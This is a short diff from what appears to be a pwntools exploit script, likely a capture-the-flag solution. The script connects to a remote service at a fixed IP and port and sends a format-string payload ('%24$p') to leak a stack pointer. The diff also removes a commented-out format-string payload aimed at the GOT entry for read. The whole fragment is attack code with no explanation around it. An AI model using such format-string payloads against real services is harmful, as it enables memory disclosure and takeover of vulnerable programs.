@@ -9,7 +9,6 @@ host = '203.66.68.95'
 port = 44444
 y = remote( host , port )
 
-#p = '%16$s.'.ljust( 0x30 , '\x00' ) + p64( e.got['read'] )
 p = '%24$p\n'
 y.send( p )
 y.recvuntil( '0x' )
